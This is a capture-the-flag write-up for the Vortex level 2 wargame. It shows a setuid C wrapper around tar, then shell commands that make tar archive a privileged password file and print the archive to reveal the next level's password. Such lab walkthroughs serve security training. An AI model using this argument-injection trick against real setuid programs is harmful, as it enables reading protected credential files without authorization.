```
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>


int main(int argc, char **argv)
{
        char *args[] = { "/bin/tar", "cf", "/tmp/ownership.$$.tar", argv[1], argv[2], argv[3] };
        execv(args[0], args);
}
```

Above is the code for the binary of vortex2. We can see the tar binary is executed with the parameters which are passed as arguments in the vortex2 binary.

If we chech the permission of vortex2 binary, we can see that it runs with vortex3 permissions. So it can open the /etc/vortex_pass/vortex3 password file.

```
vortex2@vortex:/vortex$ ls -al vortex2
-r-sr-x--- 1 vortex3 vortex2 7220 May 19  2020 vortex2
```

Now as the program expects 3 arguments we can just give it the password file as argument and it will output the tar file.

```
vortex2@vortex:/etc/vortex_pass$ /vortex/vortex2 -p -C vortex3
```

Atlast just output the tar file to stdout to get the password for the next level.
```
vortex2@vortex:~$ tar xf '/tmp/ownership.$$.tar' -O
64ncXTvx#
```